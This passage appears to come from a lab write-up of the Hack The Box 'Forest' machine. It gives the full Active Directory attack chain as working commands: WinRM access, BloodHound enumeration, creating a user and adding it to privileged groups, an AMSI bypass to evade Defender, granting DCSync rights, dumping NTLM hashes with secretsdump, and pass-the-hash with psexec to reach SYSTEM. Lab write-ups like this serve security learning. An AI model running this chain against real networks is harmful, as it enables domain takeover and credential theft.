With svc-alfresco credentials we can go for 5985 port

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Forest-10.10.10.161]
└─$ evil-winrm -i 10.10.10.161 -u 'htb.local\svc-alfresco'
Enter Password: 

[...SNIP...]

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```

Now, from our linux machine we will execute `bloodhound-python` to see more clearly our path to root

```bash
┌──(kali㉿kali)-[~]
└─$ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno -3] Temporary failure in name resolution
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 13S
```

Import all the file into bloodhound gui and the search for the user svc-alfresco, right-click and mark him as pwned. Checking the svc-alfresco node info we can see that he is a member of nine groups through nested membership. You can click and see the membership graph.

One of this groups is `Account Operators`, which is a privileged AD group. Member of this group are allowed to create and modify users and add them to non-protected groups. We take a note of this and look at the path to Domain Admins. Click on `Queries` and select `Shortest Path to High Value targets`.

![[Pasted image 20231113153318.png]]

One of the paths shows that the Exchange Windows Permissions group has WriteDacl privileges on the Domain. The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them DCSync privileges. Go back to the WinRM shell and add a new user to Exchange Windows Permissions as well as the Remote Management Users group

```bash
*Evil-WinRM* PS C:\> net user john abc123! /add /domain

*Evil-WinRM* PS C:\> net group "Exchange Windows Permissions" john /add

*Evil-WinRM* PS C:\> net localgroup "Remote Management Users" john /add

*Evil-WinRM* PS C:\> menu
[...SNIP...]
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\> Bypass-4MSI
Info: Patching 4MSI, please be patient...
[+] Success!

*Evil-WinRM* PS C:\> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\> $pass = convertto-securestring 'abc123!' -asplain -force
*Evil-WinRM* PS C:\> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
*Evil-WinRM* PS C:\> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

The Bypass-4MSI command is used to evade defender before importing the script. The Add-ObjectACL with john's credentials give him DCSync rights. Now, the secretsdump script from Impacket can now be run as john, and used to reveal the NTLM hashes for all domain users

```bash
┌──(kali㉿kali)-[~]
└─$ /usr/share/doc/python3-impacket/examples/secretsdump.py htb/john@10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[...SNIP...]
```

WIth psexec we got a root shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Forest-10.10.10.161]
└─$ impacket-psexec Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file LjbiRSPM.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service ycgK on 10.10.10.161.....
[*] Starting service ycgK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```